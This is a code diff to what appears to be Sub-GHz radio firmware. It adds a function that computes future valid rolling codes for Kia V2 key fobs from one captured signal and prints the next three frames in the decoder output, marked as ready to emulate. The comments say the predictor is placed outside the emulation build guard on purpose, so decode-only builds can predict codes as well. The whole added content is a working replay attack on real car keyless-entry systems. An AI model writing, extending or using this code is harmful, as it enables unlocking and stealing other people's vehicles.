@@ -100,6 +100,33 @@ static uint8_t kia_v2_calculate_crc(uint64_t data) {
 
     return (crc + 1) & 0x0F;
 }
+
+#define KIA_V2_PREDICT_COUNT 3U
+
+// Deterministic rolling-code generator: re-packs (serial, btn, cnt) into the
+// 53-bit frame exactly as kia_protocol_encoder_v2_deserialize (bit52 preamble,
+// serial in bits 20-51, the swizzled 12-bit counter in bits 4-15) and recomputes
+// the XOR-nibble CRC via kia_v2_calculate_crc. The 12-bit counter is cleartext and
+// the CRC is recomputable — there is no secret/manufacturer key — so the frame for
+// an arbitrary counter is exact and the returned key is load/emulate/save-able.
+// Lives outside ENABLE_EMULATE_FEATURE so decode-only builds can predict codes.
+static uint64_t kia_v2_predict_key(uint32_t serial, uint8_t btn, uint16_t cnt) {
+    uint64_t data = 0;
+
+    data |= 1ULL << 52;
+
+    data |= ((uint64_t)serial << 20) & 0xFFFFFFFFF00000ULL;
+
+    uint32_t uVar6 = ((uint32_t)(cnt & 0xFF) << 8) | ((uint32_t)(btn & 0x0F) << 16) |
+                     ((uint32_t)(cnt >> 4) & 0xF0);
+
+    data |= (uint64_t)uVar6;
+
+    uint8_t crc = kia_v2_calculate_crc(data);
+    data = (data & ~0x0FULL) | crc;
+
+    return data;
+}
 #ifdef ENABLE_EMULATE_FEATURE
 
 static void kia_protocol_encoder_v2_get_upload(SubGhzProtocolEncoderKiaV2* instance) {
@@ -436,4 +463,17 @@ void kia_protocol_decoder_v2_get_string(void* context, FuriString* output) {
         instance->generic.cnt,
         crc,
         crc_valid ? "OK" : "BAD");
+
+    // Weak rolling code (cleartext 12-bit counter, recomputable CRC, no secret
+    // key): predict the next few codes by re-packing serial/btn with (cnt+i)&0xFFF
+    // and regenerating the CRC nibble. Byte-correct and ready to load/emulate/save.
+    if(instance->generic.data_count_bit == kia_protocol_v2_const.min_count_bit_for_found) {
+        for(uint16_t i = 1; i <= KIA_V2_PREDICT_COUNT; i++) {
+            uint16_t cnt_next = (uint16_t)((instance->generic.cnt + i) & 0xFFF);
+            uint64_t next_key =
+                kia_v2_predict_key(instance->generic.serial, instance->generic.btn, cnt_next);
+            furi_string_cat_printf(
+                output, "\r\nNext+%u:%013llX", (unsigned int)i, (unsigned long long)next_key);
+        }
+    }
 }
